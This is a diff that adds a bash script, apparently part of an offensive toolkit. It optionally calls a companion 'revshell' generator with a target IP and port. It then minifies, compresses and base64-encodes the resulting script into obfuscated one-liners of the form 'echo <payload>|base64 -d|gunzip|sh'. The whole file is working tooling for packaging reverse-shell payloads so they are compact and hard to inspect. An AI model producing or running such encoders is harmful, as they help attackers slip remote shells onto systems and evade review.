@@ -1,0 +1,75 @@
+#!/usr/bin/env bash
+# Usage: encode <file> [H=<ip>] [P=<port>]
+# If H and P are given, regenerates <file> via the revshell script first.
+# Minifies (strips indentation + blank lines) then tries every available
+# compressor (gzip, xz, bzip2, zopfli) and emits a one-liner per compressor.
+
+FILE="${1:?usage: encode <file> [H=ip] [P=port]}"
+shift
+H="" P=""
+for arg in "$@"; do
+  case "$arg" in
+  H=*) H="${arg#H=}" ;;
+  P=*) P="${arg#P=}" ;;
+  esac
+done
+
+if [[ -n "$H" && -n "$P" ]]; then
+  # Always regenerate to-be-encoded.sh — never overwrite an arbitrary $FILE
+  "$(dirname "$0")/revshell" H="$H" P="$P" >/dev/null ||
+    { echo "error: revshell generation failed" >&2; exit 1; }
+  FILE="to-be-encoded.sh"
+fi
+
+[[ -f "$FILE" ]] || {
+  echo "error: $FILE not found" >&2
+  exit 1
+}
+
+minified=$(sed 's/^[[:space:]]*//' "$FILE" | grep -v '^[[:space:]]*$')
+
+try() {
+  local cmd="$1" dec="$2"
+  command -v "$cmd" &>/dev/null || return
+  local payload line
+  payload=$(printf '%s\n' "$minified" | "$cmd" -9c | base64 | tr -d '\n')
+  line="echo ${payload}|base64 -d|${dec}|sh"
+  printf '[%s %d chars] %s\n' "$cmd" "${#line}" "$line"
+}
+
+try_zopfli() {
+  if ! command -v zopfli &>/dev/null; then
+    printf '[zopfli] not found — install with:\n' >&2
+    printf '           apt:  sudo apt install zopfli\n' >&2
+    printf '           brew: brew install zopfli\n' >&2
+    printf '           src:  https://github.com/google/zopfli\n' >&2
+    return
+  fi
+  local payload line tmp
+  # Some builds support --stdout; fall back to temp-file (standard zopfli
+  # always writes <file>.gz and has no stdout flag).
+  payload=$(zopfli --gzip --i1000 -c "$FILE" 2>/dev/null | base64 | tr -d '\n')
+  if [[ -z "$payload" ]]; then
+    tmp=$(mktemp /tmp/zopfli.XXXXXX)
+    cp "$FILE" "$tmp"
+    zopfli --gzip --i1000 "$tmp" 2>/dev/null
+    [[ -f "${tmp}.gz" ]] && payload=$(base64 <"${tmp}.gz" | tr -d '\n')
+    rm -f "$tmp" "${tmp}.gz"
+  fi
+  [[ -n "$payload" ]] || {
+    printf '[zopfli] compression failed\n' >&2
+    return
+  }
+  line="echo ${payload}|base64 -d|gunzip|sh"
+  printf '[zopfli %d chars] %s\n' "${#line}" "$line"
+}
+
+SEP="==========================================================="
+
+try gzip   gunzip
+echo $SEP
+try xz     "xz -d"
+echo $SEP
+try bzip2  bunzip2
+echo $SEP
+try_zopfli
